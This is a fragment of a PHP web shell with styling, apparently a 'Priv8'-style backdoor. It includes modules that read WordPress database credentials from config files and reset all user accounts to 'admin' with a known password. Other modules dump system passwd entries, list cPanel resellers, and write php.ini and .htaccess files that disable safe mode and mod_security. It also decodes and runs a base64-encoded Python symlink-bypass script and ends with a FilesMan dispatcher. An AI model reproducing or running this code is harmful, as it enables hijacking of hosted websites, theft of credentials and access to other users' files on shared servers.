        top: 0;
        width: 100%;
        text-align: center;
        background: black;
        color:#fff;
        padding-top: 10px;
        padding-bottom: 10px;
        font-family: Open Sans;
        margin-bottom:20px;
}
#gter span{
        color:white;
        font-size: 18px;
        text-shadow: :0px 0px 15px #00ffff;
}
.f{
        color:white;
        font-family: Open Sans;
        text-shadow: 0 0 15px #00ffff;
        font-size: 21px;
}
a{
        font-family: Open Sans;
        text-decoration: none;
        color:white;
        text-shadow:0 0 15px #ff1111;
}
form{
        margin-top: 10px;
}
input[type=submit]{
        font-size:13px;
        height: 25px;
        width: 150px;
        border: 2px solid red;
        color: white;
        background-color: black;
        font-family: Open Sans;
}
input[type=submit]:hover{
        box-shadow: 0 0 2px #ff1111;
}
input[type=text]{
        font-family:Open Sans;
        width: 400px;
        height: 25px;
        color: red;
        background: #000000;
        border: 1px solid #ff1111;
        padding: 5px;
        text-align: center;
        font-size:15px;
}
input[type=text]:focus{
        box-shadow: 0 0 3px #ff1111;
}
.heading{
        color:white;
        font-size:25px;
        margin-top: 20px;
        margin-bottom: -110px;
        font-family:Open Sans;
        text-shadow:0px 0px 20px red;
}
</style>
</head>
<center>

<form method='post'>
<input type='text' name='config' placeholder='Config URL Here'>
<br><br>
<input type='submit' name='ch' value='Change Admin'>
</form>
</center>";

set_time_limit(0);
error_reporting(0);
if ($_POST['ch']) {
    $get2 = file_get_contents($_POST['config']);
    preg_match_all('#<a href="(.*?)"#', $get2, $config);
    foreach ($config[1] as $don) {
        $get = file_get_contents($_POST['config'] . "/" . $don);
        preg_match_all("#'DB_HOST', '(.*?)'#", $get, $host);
        foreach ($host[1] as $don) {
            $host = $don;
        }
        preg_match_all("#'DB_PASSWORD', '(.*?)'#", $get, $pass);
        foreach ($pass[1] as $done) {
            $password = $done;
        }
        preg_match_all("#'DB_USER', '(.*?)'#", $get, $user);
        foreach ($user[1] as $done1) {
            $user = $done1;
        }
        preg_match_all("#'DB_NAME', '(.*?)'#", $get, $name);
        foreach ($name[1] as $done2) {
            $name = $done2;
        }
        preg_match_all("#$table_prefix  = '(.*?)'#", $get, $prefix);
        foreach ($prefix[1] as $done3) {
            $prefix = $done3;
        }
        $connect = mysqli_connect($host, $user, $password, $name);
        if ($connect) {
            $query1 = mysqli_query($connect, "select * from " . $prefix . "options where option_name='siteurl'");
            while ($siteurl = mysqli_fetch_array($query1)) {
                $site_url = $siteurl['option_value'];
            }
            $query2 = mysqli_query($connect, "update " . $prefix . "users set user_login='admin',user_pass='a09ac1f98189b89fd578b4fca7bf8bb2'");
            if ($query2) {
                echo "<center><span class=f>URL : <a href='$site_url/wp-login.php' target='_blank'>$site_url/wp-login.php</a><br><br>UserName : admin<br><br>Password : Priv8shell<br><br></span></center>";
            }
        }
    }
}
 echo"</body></html>";

    die;
}

if (isset($_REQUEST['reseller'])) {
echo"<html>  <body style='text-align: center'> <center> <table border='1' width='50%' cellspacing='0' cellpadding='15' style='border-width: 0px'>               <tr>                    <td background='http://buyshellsites.com/bg.gif' style='border-style: none; border-width: medium'> <div align='center'>     <table border='1' width='100%' bgcolor='#000000' cellpadding='0' style='border-collapse: collapse' bordercolor='#333333'>         <tr>                            <td width='100' align='center'>                 <font face='Courier New' size='2' color='#ff1111'>Reseller</font></td>                 <td width='100' align='center'>         <font face='Courier New' size='2' color='#ff1111'>Accounts</font></td>          <td width='100' align='center'>       <font face='Courier New' size='2' color='#ff1111'>Symlink</font></td>            </tr> </table>   <BR>";



## grabs resellerss file
$lines = file("/etc/trueuserowners");


## split pure resellers's names
for ($i = 0; $i < count($lines); $i++) {
$values2 = split(': ', $lines[$i]);
$resellers[$i] = $values2['1'];
}

## remove duplicated resellerss and empty values
$resellers = array_unique($resellers);
$resellers = array_filter($resellers);

foreach($resellers as $reseller){
        $count = 0;
for ($i = 0; $i < count($lines); $i++) {

        if (strpos($lines[$i], ": $reseller") ) {
    $count = $count+1;
}

}

print '<table border="1" width="100%" bgcolor="#333333" cellpadding="0"  style="border-collapse: collapse" bordercolor="#000000">
        <tr>

                <td width="100" align="center">
                <font face="Courier New" size="2" color="#ff1111">'.$reseller.'</font></td>
                <td width="100" align="center">
                <font face="Courier New" size="2" color="#ff1111">'.$count.'</font></td>
                <td width="100" align="center">
                <a href="./sym1/root/home/'.$reseller.'/public_html/" target="_blank"><font face="Courier New" size="2" color="#ff1111">Symlink</font></td>

        </tr>
</table>



<BR></center> </body>  </html>';
}


    die;
}

if (isset($_REQUEST['passwd'])) {
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
 echo '<center>';
        echo "<textarea class='inputz' cols='90' rows='20'>";
        for ($uid = 0;$uid < 60000;$uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    print "$val:";
                }
                print "
";
            }
        }
        echo "</textarea><br><br>";
    
    die;
}
if (isset($_REQUEST['disabled'])) {
echo "<html>

<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions  =    NONE
open_basedir = OFF ");
echo "<center><b><font color='white' size='4'>[SafeMode Done]</font></center>";
echo ("");

$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"
<IfModule mod_security.c>
KillFilterEngine Off
KillFilterScanPOST Off
KillFilterCheckURLEncoding Off
KillFilterCheckUnicodeEncoding Off
</IfModule>
");


echo "<center><b> <font color='white' size='4'>[Mod_Security Done]</font></center>";
    die;
}
if (isset($_REQUEST['sym'])) {
error_reporting(0);
$sym_dir = mkdir('priv_sympy', 0755);
chdir('priv_sympy');
$file_sym = "sym.py";
$sym_script = "Iy8qUHl0aG9uCgppbXBvcnQgdGltZQppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgcmUKCm9zLnN5c3RlbSgiY29sb3IgQyIpCgpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIgpmID0gIkFsbCBQcm9jZXNzZXMgRG9uZSFcblN5bWxpbmsgQnlwYXNzZWQgU3VjY2Vzc2Z1bGx5IVxuIgpwcmludCAiXG4iCgpvcy5tYWtlZGlycygnc3ltJykKb3MuY2hkaXIoJ3N5bScpCgpzdXNyPVtdCnNpdGV4PVtdCm9zLnN5c3RlbSgibG4gLXMgLyBwcml2OC50eHQiKQoKaCA9ICJPcHRpb25zIEluZGV4ZXMgRm9sbG93U3ltTGlua3NcbkRpcmVjdG9yeUluZGV4IHByaXY4LnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIgptID0gb3BlbigiLmh0YWNjZXNzIiwidysiKQptLndyaXRlKGgpCm0uY2xvc2UoKQpwcmludCBodGEKCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+UHJpdjggU215bGluazxicj48L2ZvbnQ+PGJyPjxmb250IGNvbG9yPXdoaXRlIHNpemU9Mz48dGFibGU+IgoKbyA9IG9wZW4oJy9ldGMvcGFzc3dkJywncicpCm89by5yZWFkKCkKbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykKCmZvciB4dXNyIGluIG86Cgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykKCXN1c3IuYXBwZW5kKHh1c3IpCnByaW50ICItIiozMAp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQoKZm9yIHh4c2l0ZSBpbiB4c2l0ZToKCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikKCXNpdGV4LmFwcGVuZCh4eHNpdGUpCnByaW50IGYKcGF0aD1vcy5nZXRjd2QoKQppZiAiL3B1YmxpY19odG1sLyIgaW4gcGF0aDoKCXBhdGg9Ii9wdWJsaWNfaHRtbC8iCmVsc2U6CglwYXRoID0gIi9odG1sLyIKY291bnRlcj0xCmlwcz1vcGVuKCJwcml2OC5waHRtbCIsInciKQppcHMud3JpdGUoc2YpCgpmb3IgZnVzciBpbiBzdXNyOgoJZm9yIGZzaXRlIGluIHNpdGV4OgoJCWZ1PWZ1c3JbMDo1XQoJCXM9ZnNpdGVbMDo1XQoJCWlmIGZ1PT1zOgoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9cHJpdjgudHh0L2hvbWUvJXMlcyB0YXJnZXQ9X2JsYW5rID4lczwvYT48L3RkPiIlKGNvdW50ZXIsZnVzcixmdXNyLHBhdGgsZnNpdGUpKQoJCQljb3VudGVyPWNvdW50ZXIrMQ==";
$sym = fopen($file_sym, "w");
fwrite($sym, base64_decode($sym_script));
chmod($file_sym, 0755);
$khoer = exec("python sym.py");
echo "<br><center><font color='white'>Done ...</font> <a href='priv_sympy/sym/' target='_blank'><font color='red'>Click Here</font> </a>";
    die;
}
// xd
if( empty($_POST['a']) )
        if(isset($▚) && function_exists('action' . $▚))
                $_POST['a'] = $▚;
        else
                $_POST['a'] = 'FilesMan';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
        call_user_func('action' . $_POST['a']);
?> 